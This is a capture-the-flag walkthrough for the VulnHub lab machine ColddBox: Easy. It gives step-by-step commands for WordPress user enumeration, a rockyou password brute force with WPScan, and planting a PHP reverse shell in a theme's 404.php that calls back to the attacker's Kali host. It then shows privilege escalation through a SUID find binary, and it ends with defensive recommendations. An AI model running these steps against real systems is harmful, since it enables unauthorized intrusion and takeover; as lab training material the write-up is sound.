# ColddBox: Easy (VulnHub)

## Overview

**ColddBox: Easy** is a beginner-friendly VulnHub machine created by **Martin Frias (C0ldd)**. The machine focuses on WordPress enumeration, credential attacks, web shell deployment, and Linux privilege escalation through a misconfigured SUID binary.

The challenge demonstrates how weak WordPress credentials, unrestricted administrative functionality, and insecure Linux permissions can be chained together to achieve complete system compromise.

## Machine Information

| Attribute | Value |
|------------|---------|
| Machine Name | ColddBox: Easy |
| Author | Martin Frias (C0ldd) |
| Series | ColddBox |
| Platform | VulnHub |
| Release Date | 23 October 2020 |
| Difficulty | Easy |
| Target OS | Ubuntu |
| Attacker Machine | Kali Linux |
| Objective | Gain Root Access |

## Skills Demonstrated

- Network Discovery
- Service Enumeration
- Nmap Scanning
- Web Enumeration
- Directory Enumeration
- WordPress Enumeration
- WPScan
- Credential Brute Forcing
- WordPress Administration
- PHP Reverse Shell Deployment
- Remote Code Execution
- Shell Stabilization
- Linux Enumeration
- SUID Enumeration
- GTFOBins
- Linux Privilege Escalation
- Post Exploitation

## Tools Used

- Netdiscover
- Nmap
- Gobuster
- WPScan
- Netcat
- Python3
- GTFOBins
- Linux Shell Commands
- Kali Linux

## Attack Methodology

1. Discover the target machine.
2. Enumerate open services.
3. Identify the WordPress installation.
4. Discover hidden directories.
5. Enumerate WordPress users.
6. Brute-force WordPress credentials.
7. Gain administrator access.
8. Upload a PHP reverse shell.
9. Obtain a www-data shell.
10. Stabilize the shell.
11. Enumerate SUID binaries.
12. Abuse the SUID-enabled `find` binary.
13. Escalate privileges to root.
14. Capture both user and root flags.

## Network Discovery

Identify active hosts:

```bash
sudo netdiscover -i eth0
```

Result:

```text
192.168.10.27
```

The target machine was successfully identified on the local network.

## Open Services Identified

Perform service enumeration:

```bash
sudo nmap -sC -sV 192.168.10.27 --min-rate 10000
```

### Nmap Results

| Port | Service | Version |
|------|----------|---------|
| 80 | HTTP | Apache 2.4.18 |
| CMS | WordPress | Version 4.1.31 |

Only the HTTP service was exposed, and WordPress was detected.

## Website Enumeration

Browse to:

```text
http://192.168.10.27
```

A WordPress website was identified.

Since the CMS was detected, WordPress-specific enumeration was performed.

## Directory Enumeration

Perform directory brute forcing:

```bash
gobuster dir -u http://192.168.10.27/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt,old,bak
```

Interesting findings:

```text
/wp-login.php
/wp-admin
/xmlrpc.php
/hidden
```

The discovered directories confirmed a standard WordPress installation with an exposed login portal.

## WordPress User Enumeration

Enumerate users:

```bash
wpscan --url http://192.168.10.27 --enumerate u
```

Discovered users:

```text
philip
hugo
c0ldd
```

The **c0ldd** account appeared to be the most promising target.

## Credential Attack

Perform a password attack:

```bash
wpscan --url http://192.168.10.27 --usernames c0ldd --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login
```

Recovered credentials:

```text
Username: c0ldd
Password: 9876543210
```

The administrator credentials were successfully recovered.

## Initial Access

Authenticate to the WordPress dashboard:

```text
http://192.168.10.27/wp-admin
```

Successful authentication provided administrator privileges.

## Remote Code Execution

Navigate to:

```text
Appearance → Theme Editor
```

Edit:

```text
404.php
```

Upload a PHP reverse shell and configure:

```php
$ip = 'YOUR_KALI_IP';
$port = 1234;
```

Start a listener:

```bash
nc -lnvp 1234
```

Trigger the shell:

```text
http://192.168.10.27/wp-content/themes/twentyfifteen/404.php
```

Reverse shell obtained:

```text
uid=33(www-data)
```

Remote code execution was successfully achieved.

## Shell Stabilization

Upgrade the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Verify:

```bash
whoami
```

Output:

```text
www-data
```

## User Enumeration

Inspect user directories:

```bash
cd /home
ls
```

Discovered user:

```text
c0ldd
```

Attempting to read the user flag resulted in:

```text
Permission denied
```

Privilege escalation was required.

## SUID Enumeration

Search for SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

Interesting finding:

```text
/usr/bin/find
```

A SUID-enabled `find` binary was identified.

## Privilege Escalation

Abuse the SUID binary using GTFOBins:

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

Verify privileges:

```bash
id
```

Output:

```text
uid=33(www-data) gid=33(www-data) euid=0(root)
```

Root privileges were successfully obtained.

## User Flag

Read the flag:

```bash
cat /home/c0ldd/user.txt
```

The flag is Base64 encoded.

Decode:

```bash
echo "BASE64_STRING" | base64 -d
```

Output:

```text
Felicidades, primer nivel conseguido!
```

(English: Congratulations, first level achieved!)

## Root Flag

Read:

```bash
cat /root/root.txt
```

Decode:

```bash
echo "BASE64_STRING" | base64 -d
```

Output:

```text
¡Felicidades, máquina completada!
```

(English: Congratulations, machine completed!)

## Vulnerabilities Identified

### 1. Weak WordPress Credentials

The administrator account used a weak password that was successfully brute-forced.

### 2. User Enumeration

WPScan disclosed valid WordPress usernames.

### 3. Administrative Theme Editor Abuse

Administrator access allowed direct modification of PHP files, resulting in remote code execution.

### 4. Remote Code Execution

A PHP reverse shell executed arbitrary system commands.

### 5. Dangerous SUID Configuration

The SUID-enabled `find` binary allowed privilege escalation using GTFOBins.

## Attack Chain Summary

- Network Discovery using Netdiscover
- Service Enumeration using Nmap
- Website Enumeration
- Directory Enumeration using Gobuster
- WordPress User Enumeration
- WPScan Password Attack
- Administrator Dashboard Access
- PHP Reverse Shell Deployment
- Remote Code Execution
- Shell Stabilization
- SUID Enumeration
- GTFOBins Privilege Escalation
- User Flag Retrieval
- Root Flag Retrieval

## Security Recommendations

- Enforce strong password policies.
- Enable account lockout against brute-force attacks.
- Disable or restrict XML-RPC when unnecessary.
- Remove Theme Editor functionality from production environments.
- Apply the principle of least privilege.
- Audit SUID binaries regularly.
- Restrict dangerous binaries.
- Keep WordPress core, themes, and plugins updated.
- Perform regular vulnerability assessments.

## Key Learning Outcomes

- WordPress enumeration reveals valuable attack surface.
- Weak passwords remain a common entry point.
- Administrative access can quickly lead to remote code execution.
- PHP reverse shells provide reliable initial access.
- GTFOBins is an essential resource for Linux privilege escalation.
- Misconfigured SUID binaries can completely compromise a system.

## Conclusion

ColddBox: Easy is an excellent beginner-level VulnHub machine that introduces WordPress penetration testing, credential attacks, web shell deployment, and Linux privilege escalation. The machine demonstrates how weak credentials and insecure Linux configurations can be chained together to achieve full system compromise, making it an ideal lab for learning real-world penetration testing methodology.

---

**Author:** Omkar Babaji Sawant

**Repository:** VulnHub-Walkthroughs
